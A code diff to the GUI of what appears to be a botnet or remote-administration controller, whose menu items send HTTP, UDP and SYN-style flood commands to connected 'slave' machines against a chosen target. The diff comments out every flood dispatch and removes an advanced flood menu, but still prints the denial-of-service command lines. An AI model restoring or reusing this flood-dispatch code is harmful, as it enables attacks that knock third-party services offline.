@@ -1065,7 +1065,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_GET, new String[] { !target.startsWith("http://") ? "http://" + target : target, time1 + "" }));
+						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_GET, new String[] { !target.startsWith("http://") ? "http://" + target : target, time1 + "" }));
 					}
 				}
 			}
@@ -1101,7 +1101,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.FLOOD_UDP, new String[] { target, time1 + "" }));
+						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_UDP, new String[] { target, time1 + "" }));
 					}
 				}
 			}
@@ -1128,7 +1128,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_POST, new String[] { target, time1 + "" }));
+						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_POST, new String[] { target, time1 + "" }));
 					}
 				}
 			}
@@ -1158,7 +1158,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_HEAD, new String[] { target, time1 + "" } ));
+						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_HEAD, new String[] { target, time1 + "" } ));
 					}
 				}
 			}
@@ -1189,7 +1189,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.FLOOD_SSYN, new String[] { target, time1 + "" }));
+						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_SSYN, new String[] { target, time1 + "" }));
 					}
 				}
 			}
@@ -1218,7 +1218,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.FLOOD_DRAIN, new String[] { target, time1 + "" } ));
+						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_DRAIN, new String[] { target, time1 + "" } ));
 					}
 				}
 			}
@@ -1254,26 +1254,13 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.FLOOD_ARME, new String[] { target, time1 + "" } ));
+						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_ARME, new String[] { target, time1 + "" } ));
 					}
 				}
 			}
 		});
 		mntmArme.setIcon(new ImageIcon(Frame.class.getResource("/icons/flood_arme.png")));
 		mnFlood.add(mntmArme);
-		mnFlood.addSeparator();
-
-		JMenuItem mntmAdvanced = new JMenuItem("Advanced...");
-		mntmAdvanced.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> list = Util.getSlaves();
-				if (list.size() > 0) {
-					FrameAdvancedFlood flood = new FrameAdvancedFlood(list);
-					flood.setVisible(true);
-				}
-			}
-		});
-		mnFlood.add(mntmAdvanced);
 		popupMenu.addSeparator();
 
 		JMenuItem mntmInfo = new JMenuItem("Info");
